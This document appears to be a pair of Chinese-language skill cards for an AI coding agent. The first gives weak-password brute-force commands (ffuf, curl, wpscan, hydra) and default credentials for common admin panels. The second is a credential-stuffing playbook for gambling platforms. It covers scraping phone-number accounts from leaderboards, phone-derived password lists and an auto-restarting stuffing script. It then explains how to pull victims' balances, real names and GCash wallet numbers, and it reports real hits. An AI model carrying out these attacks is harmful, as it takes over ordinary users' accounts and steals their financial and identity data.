---
name: auth-brute
description: >-
 授权站登录面短字典弱口：/admin/login、/api/login、wp-login。
 用户提到弱口令、爆破、hydra、后台默认密码、admin888 时使用。
 PMA/宝塔走 panel_surface_probe；Nacos/Druid/Grafana 走专卡；锁号即停。
 旧名 `auth-sec` / `auth-agent` / `password-attacks-credential-access` 已并入本卡。登录注入走 `authbypass-authentication-flaws`。
---

# 弱口令与认证爆破（Cursor Skill）

## ⛔ 爆破纪律（最高优先级·所有模型必须遵守）

> **口令爆破是最低 ROI 手段。绝大多数现代站用强密码，爆破几乎不会成功。**

1. **只跑一轮短字典（≤30 次 POST）**，用 `auth_brute_probe.py --limit 24`。**一轮打完立刻切其他攻击面**，禁止换字典再来、禁止「再试一批」。
2. **429/限流/锁号 = 立刻停手换刀**，禁止 sleep 等限流解除后继续、禁止换 IP 重撞同一登录口、禁止「等几分钟再试」。
3. **认证突破优先级**（爆破排最后）：
   - ① 默认口令（admin:admin 等 5 组，直接试）
   - ② 信息泄露拿密码（heapdump/.env/git/JS 硬编码/配置文件/明文日志）
   - ③ 认证绕过（JWT 弱密钥/2FA 跳过/密码重置链/信任头/Session 固定）
   - ④ 未授权接口（不需要登录就能打的 API）
   - ⑤ 注册新账号（开放注册 → 低权进去 → 提权/IDOR）
   - ⑥ 短字典一轮（到此为止，≤30 次）
4. **限流后必须切刀**，按顺序尝试：未授权端点 → 信息泄露 → 逻辑漏洞 → 注入 → 源站/旁站。**不要回头爆破**。

---

## 真源

1. `docs/playbooks/弱口令与认证爆破手法.md`
2. `python3 tools/ops/auth_brute_probe.py -u https://授权站 --case <案卷>`
3. 缺站点字典时：`python3 tools/ops/stdlib_fallback.py wordlist_gen -- -u https://授权站`

## 强制

1. 目标在 scope。默认 `--limit 24`，禁止无上限 hydra。
2. `locked=true` → 停撞，换验证码/极验卡或写复工。
3. L2 命中立刻填对象矩阵，禁止「能登录」当结案。
4. 面板口走 `宝塔与phpMyAdmin拿面板手法.md`。

---

## 一、指纹识别与登录面发现

```bash
# 快速扫后台登录路径（ffuf 字典爆破）
ffuf -u https://<目标>/FUZZ -w /usr/share/wordlists/dirb/common.txt \
 -mc 200,301,302 -fc 404 -t 30 -timeout 10 \
 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" 2>/dev/null | grep -iE 'admin|login|manage|backend|console'

# 常见后台路径（手动验证）
# /admin /admin/login /admin/index /backend
# /manage /manage/login /console /dashboard
# /wp-admin /wp-login.php /phpmyadmin
# /api/login /api/auth/login /api/v1/auth/login
# /user/login /member/login /operator/login

# 检查响应特征（HTML title / form action / JS框架）
curl -sk https://<目标>/admin/login -L | grep -iE '<title>|form action|X-Powered-By|Vue|React'
```

---

## 二、弱口令字典（默认优先级顺序）

```
# 超短必试（≤5次，无论有无锁）
admin:admin
admin:admin123
admin:Admin123
admin:admin@123
admin:123456
admin:password
admin:12345678
root:root
root:toor
test:test123

# 业务特征密码（从域名/公司名衍生）
<域名前缀>123
<域名前缀>@2024
<域名前缀>888
<公司缩写>2024
Q@zwsx123 # 极常见弱口
Aa@123456
Admin@2024
Admin888
```

---

## 三、具体场景命令

### 3.1 ThinkPHP / FastAdmin 类后台

```bash
# 工具：auth_brute_probe.py 自动检测锁定
python3 tools/ops/auth_brute_probe.py \
 -u https://<授权站>/admin/login \
 --user admin \
 --dict tools/ops/dict/admin_pass_short.txt \
 --limit 24 --delay 1.5 \
 --case <案卷>

# 手动 curl 验证登录（ThinkPHP JSON 接口）
curl -sk https://<授权站>/admin/login -X POST \
 -H 'Content-Type: application/json' \
 -H 'X-Requested-With: XMLHttpRequest' \
 -d '{"username":"admin","password":"admin123"}' | python3 -m json.tool
```

### 3.2 WordPress wp-login.php

```bash
# WPScan 弱口令探测（授权站）
wpscan --url https://<授权站> --usernames admin,administrator \
 --passwords tools/ops/dict/wp_pass_short.txt \
 --max-threads 3 --request-timeout 15 2>/dev/null

# 手动 POST wp-login
curl -sk https://<授权站>/wp-login.php -c /tmp/wp_cookie.txt -X POST \
 -d 'log=admin&pwd=admin123&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' \
 -H 'Cookie: wordpress_test_cookie=WP+Cookie+check' \
 -L | grep -iE 'Dashboard|wp-admin|incorrect|错误'
```

### 3.3 芋道 / Spring Boot 类 API

```bash
# 芋道后台登录（admin-api）
curl -sk https://<授权站>/admin-api/system/auth/login -X POST \
 -H 'Content-Type: application/json' \
 -d '{"username":"admin","password":"admin123","captchaVerification":""}' \
 | python3 -m json.tool

# Bearer test1 快速尝试（芋道特有）
curl -sk https://<授权站>/admin-api/system/user/page \
 -H 'Authorization: Bearer test1' | python3 -m json.tool
```

### 3.4 GVA (Gin-Vue-Admin) 类

```bash
# GVA 登录接口
curl -sk https://<授权站>/api/base/login -X POST \
 -H 'Content-Type: application/json' \
 -d '{"username":"admin","password":"Admin@123456","captcha":"","captchaId":""}' \
 | python3 -m json.tool

# 常见 GVA 默认密码
# admin:Admin@123456 admin:Admin@123 admin:Admin123456 admin:123456
```

### 3.5 Laravel / Vue3 SPA 类（epay 模板）

```bash
# 先获取 CSRF token
CSRF=$(curl -sk https://<授权站>/admin/ | grep -o 'csrf-token" content="[^"]*"' | cut -d'"' -f3)

# 再发登录
curl -sk https://<授权站>/admin/auth/login -X POST \
 -H 'Content-Type: application/json' \
 -H 'X-Requested-With: XMLHttpRequest' \
 -H "Referer: https://<授权站>/admin/" \
 -d '{"username":"admin","password":"admin123","enc":0}' \
 | python3 -m json.tool
```

### 3.6 hydra 快速爆破（明确无锁时使用）

```bash
# HTTP POST JSON 接口（需要 hydra ≥ v9）
hydra -l admin -P tools/ops/dict/admin_pass_short.txt \
 <授权IP> https-post-form \
 "/admin/auth/login:username=^USER^&password=<REDACTED>" \
 -t 4 -w 3 -f -o /tmp/hydra_result.txt

# 限速版（避免锁号）
hydra -l admin -P tools/ops/dict/admin_pass_short.txt \
 <授权IP> https-post-form \
 "/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:F=error" \
 -t 1 -w 5 -f
```

---

## 四、锁号检测与处理

```bash
# 锁号特征关键词（检查响应体）
# ThinkPHP: "你还可以尝试N次" / "已被锁定" / "暂时禁止"
# FastAdmin: "账号或密码错误，请重试" + 计数
# WordPress: "ERROR: Too many failed login attempts"
# GVA: {"code":7,"msg":"验证码错误"}（验证码挡在密码之前）

# 检测是否锁定的探针请求
curl -sk https://<授权站>/admin/login -X POST \
 -H 'Content-Type: application/json' \
 -d '{"username":"admin","password":"locktest_$(date +%s)"}' \
 | python3 -m json.tool
```

**锁号后处理流程**：
1. **立刻停止爆破**，记录已尝试密码，**立刻切换到其他攻击面**
2. 禁止等锁定窗口解除后继续爆、禁止换 IP 重撞
3. 有验证码/极验 → 走 `captcha-ocr` / `geetest-captcha-bypass` skill
4. 在 STATUS.md 记录「弱口令一轮完毕,未命中,已切换」

---

## 五、默认凭据速查表

| 系统 | 常见默认账户 | 常见默认密码 |
|------|------------|------------|
| Nacos | nacos | nacos |
| Grafana | admin | admin |
| Druid Monitor | - | （无默认鉴权） |
| Jenkins | admin | （安装时设置） |
| phpMyAdmin | root | （空/root） |
| Nexus | admin | admin123 |
| Harbor | admin | Harbor12345 |
| Gitlab | root | 5iveL!fe |
| Portainer | admin | （首次设置） |
| Kibana | elastic | changeme |
| RabbitMQ Management | guest | guest |

---

## 六、成功口径

| 级别 | 条件 |
|------|------|
| L1 | 发现登录面且枚举出用户名 |
| L2 | 成功登录（弱口令命中，可获取 token/session） |
| L3 | 登录后有管理权限（用户列表/配置/支付操作等） |

## 七、红线

- **无上限爆破**：必须设 `--limit`，严格计数
- **锁号不停**：检测到锁定特征立即停止
- **接管后忘填矩阵**：L2 命中必须填 `测绘/object_matrix.md`
- **Nacos/Druid/Grafana 走专卡**，不要用本卡重复

---

<!-- 补充视角: credential-stuffing (兄弟技能库 2026-09-12) -->

---
name: credential-stuffing
description: "撞库与账号接管: 泄露账号列表加弱密码批量登录, 命中后提取资金数据。"
version: 1.0.0
author: SurveyEngine Agent
license: MIT
platforms: [windows, linux, macos]
metadata:
    category: security
    related_skills: [wasm-ws-protocol-crack, password-cracking, card-shop-pentest, vip-bypass]
---

# 撞库与账号接管 Skill (Credential Stuffing)

针对**账号即手机号/用户名**(博彩/卡密商城/社交类平台极常见)的目标,用公开渠道泄露的账号列表 + 弱密码批量尝试登录,命中后提取每个账号的完整资金/个人信息。本类攻击不需要越权 — 弱密码就是漏洞。

## When to Use

- 已有账号列表可当用户名: 排行榜泄露、用户枚举、注册接口可枚举、历史泄露数据
- 登录接口可自动化 (REST / WS 二进制协议)
- 目标想拿"用户数据"但 IDOR/管理端都封死时 — 撞库是最后一条活路

## Prerequisites

- 账号列表 (见下"账号来源")
- 登录接口的自动化能力 (抓包/协议逆向)
- 登录错误码可区分 (rc=11 密码错误 vs rc=1 账号不存在 = 用户枚举已确认)
- node + wasm C 库加载模板 (若目标 WS 协议) 或 requests/curl (REST)

## 账号来源 (按优先级)

1. **排行榜/公开榜单接口** — 博彩平台"投注排行/代理排行"常返回未脱敏完整账号 (账户体系=手机号) + 投注金额。分页拉取 (rankNumMin/Max 每页 50 通常最多 10 页), 多榜单组合 (Jackpot/Commission × 今日/代理/历史)。
2. 用户枚举 (错误码区分确认账号存在)
3. 注册接口可枚举 + 验证码绕过
4. 公开滚动消息 (nickName+score, 若有)
5. 历史泄露数据 (撞库素材)

## 密码表构造 (菲律宾/东南亚博彩用户实测)

优先级: 手机号后6位 > 后4位x2 > 账号后8位 > 常见弱密码。

```javascript
// 账号 = 00639xxxxxxxxx (00+63+手机号)
const local = acc.slice(6);       // 8位本地号
const last6 = local.slice(2);     // 后6位
const last4 = local.slice(4);     // 后4位
personal = [last6, last4+last4, acc.slice(-8)];
common = ['123456','888888','123123','666666','000000','111111','abc123','qwerty',
          '12345678','password','admin123','a123456','123456a','Aa123456','123456789'];
```

实测命中率 ~0.5-1%, 命中密码几乎全是 `123456`。每账号 8-15 个密码组合足够。

## 断点续跑 (关键! 长跑任务必备)

node 脚本在后台跑会频繁崩溃 (rc=1), **没有断点续跑 = 每次崩溃从头扫, 效率极低**。

```javascript
// 1. 进度持久化: 每测一组写 progress JSON
const PROGRESS_FILE = 'brute_progress.json';
// { done: ["acc|pwd", ...], hits: [...] }
// 启动时 loadProgress() → doneSet → queue = all.filter(c => !doneSet.has(c))

// 2. 命中实时写 hits JSON (崩溃不丢)

// 3. 完成标记文件 → 包装器检测后退出
```

包装器 (Windows, Hermes background 跑 node 会 "stdin is not a tty" 失败):

```python
# brute_wrapper.py — 用 Python 起 node, 崩溃自动重启
import subprocess, time, os
def run_once():
    with open(log, 'a') as f:
        return subprocess.Popen(['node', 'brute.js'], stdout=f, stderr=subprocess.STDOUT)
p = run_once()
while True:
    if p.poll() is not None:
        if os.path.exists(done_file): break
        time.sleep(5); p = run_once()
    time.sleep(10)
```

## 命中后数据提取 (每条命中 = 完整资金画像)

登录成功后依次查询 (WS 协议或 REST):
- 登录响应: 昵称 / userID / 余额 / **isAgent** (代理标记!)
- GetScoreInfo (110): score / insure / cCoin
- GetPayRecord: 充值记录
- GetWithdrawRecord: 提现记录
- GetLastPayInfo: 最近支付 (常需 dynamicPass)
- GetMobiles (1278): 绑定手机号 (账号即手机号, 但可确认)

### ⭐ 身份提取 (最敏感数据): GetWithdrawHistoryAccount

```
协议号: SUB_MB_GetWithdrawHistoryAccount = 1224 (mcmd=3)
请求: {userID, dynamicPass}
响应 (UTF16 字符串直接可读, 无需复杂解码):
  提现渠道 (gcash / bank) + 真实姓名 + GCash钱包号 / 银行卡号
```

**撞库命中 → 登录 → 此接口 = 真实姓名 + 支付钱包号**(用户身份确认, 菲律宾 GCash 钱包号 = 手机号)。m9600 实战 8 个命中账号, 3 个提取到真实姓名 + 4 个 GCash 钱包号。

### ⭐ 查询接口批量扫描 (找全部用户数据接口)

别只测已知接口 — 从 main.js 协议表提取所有**请求模板含 userID 的查询接口** (Get*/Query*/Load*/Status*/Record*), 登录后逐个发, 记录响应长度+可读字符串:

```bash
python3 scripts/extract_user_query_interfaces.py main.js   # → queries.json
```

(脚本: `scripts/extract_user_query_interfaces.py`, 输出 98 个含 userID 接口, 其中 ~24 个纯查询值得测。) 扫描器要加**超时兜底** (每接口 3 秒无响应自动跳过, 否则卡死) + 短包文本提取 try/catch (边界越界会崩)。

### 滚动消息/公开展示接口 (可能无需登录)

```
GetScrollMessage (1262) / GetH5TopScrollMessageInfo (1264): {userID, queueIndex}
响应: [{nickName, score}] — 活跃用户昵称+金额, 公开展示用途
```

**必须用 mcmd=3 (MDM_GP_USER_SERVICE), 不是 mcmd=1 (MDM_MB_LOGON)!** 用错主命令 = 无响应, 这是本类平台最常见陷阱之一 (排行榜 2544/2714 同样必须 mcmd=3)。

## isAgent=1 的命中账号 = 代理

## Procedure

1. 收集账号列表 (排行榜接口优先, 提取纯手机号格式账号)
2. 构造密码组合 (个性化 + 弱密码)
3. 写断点续跑撞库脚本 (进度/命中/完成标记三文件)
4. Python wrapper 后台运行
5. 并行做其他攻击面 (登录绕过测试 / IDOR 验证 / API 枚举)
6. 定期查命中文件
7. 撞库完成后批量提取命中账号资金数据, 生成报告

## Pitfalls

1. **登录限流**: 服务器可能对失败返回 9999/系统繁忙 → 跳过该账号剩余组合, 不要硬刚。
2. **WS 连接保持**: 二进制协议 C 库的 msgCb 必须 return true, 否则每响应断连 (见 wasm-ws-protocol-crack)。
3. **IDOR 别假设**: 登录后先查自己确认, 再查 userID=1; 查别人 101/105 = 归属校验存在, 撞库才是正路。
4. **代理账号才是金矿**: 普通玩家命中只有自己的数据; 代理 (isAgent=1) 能看下线用户列表 = 指数级扩大。
   - **陷阱: 代理排行榜 (排行榜 type=1) 命中的账号实测 isAgent=0!** "代理排名/佣金排名" 只是推广佣金榜, 上榜账号不一定是平台真代理。专项撞库前先登录确认 isAgent, 别假设。
   - 真代理 (isAgent=1) 很少, 撞库 1454 账号 0 命中; 分享/邀请接口 (ShareLotteryGetInviteRecords 1706) 查别人返回 105 = 归属校验, 普通账号查不到下线。
5. **错误码 = 用户枚举**: rc=11 密码错误(存在) vs rc=1 无效(不存在) — 撞库前先确认枚举能力。
6. **别在管理端死磕**: 白标平台管理后台在服务商内网, 公网无入口 (SPA fallback 全 200 是陷阱)。
7. **限速纪律**: 窄、串行、每组合间隔 ~100ms, 命中率高但别触发风控封 IP。
8. **mcmd 用错 = 无响应**: 二进制 WS 协议里, 同一 scmd 在不同主命令下行为完全不同。GetScrollMessage(1262)/排行榜(2544/2714) 必须 mcmd=3 (MDM_GP_USER_SERVICE), 用 mcmd=1 (MDM_MB_LOGON) 会静默无响应。接口无响应时先怀疑 mcmd, 再怀疑参数。
9. **身份提取比余额更值钱**: 命中后别只拿余额 — GetWithdrawHistoryAccount(1224) 能拿真实姓名+GCash 钱包号, 这才是用户身份确认的关键数据。
10. **接口全量测绘别测 LOGON_EXIT**: 批量扫描所有 SUB 接口时, LOGON_EXIT (scmd=11) 是退出登录接口 — 测了直接退出会话, 后续全部 alloc failed。只扫查询类, 操作类 (Take/Reward/Done/Set) 参数错会超时, 最后再确认。
11. **CPF/税号类接口可能未启用**: GetPayBindParam(2246) 理论上返回绑定 CPF (巴西税号), 但实测服务器端无响应 — 查不到就是查不到, 别死磕; 提现账户 (1224) 里也只有 渠道+姓名+钱包号, 无 CPF。
12. **客服系统是独立攻击面但白标锁死**: 客服 API 在独立域名 (apic.xxx), 真实路径要 CDP 抓包 (动态 chunk) 才能发现; 请求格式是明文 JSON + X-Timestamp 加密头 + merchant-id + cid; cid 校验严格不可枚举, 客服工作台 (/service) 存在但 401 无登录入口。

## Verification

- ✅ 撞库命中 (登录返回成功 + userID)
- ✅ 命中账号登录后能提取余额/充值/提现
- ✅ 命中代理账号能看下线用户列表 (数据放大)
- ✅ 报告: 命中账号清单 + 资金画像 + 复现命令


## 全文导航（已拆分）

主卡保留前 20 节；其余 7 节在 `references/full.md`：

- 详细实战案例
- When to Use
- Prerequisites
- Procedure
- Pitfalls (血泪教训)
- Verification
- References

加载：`skill_view(name='auth-brute', file_path='references/full.md')`
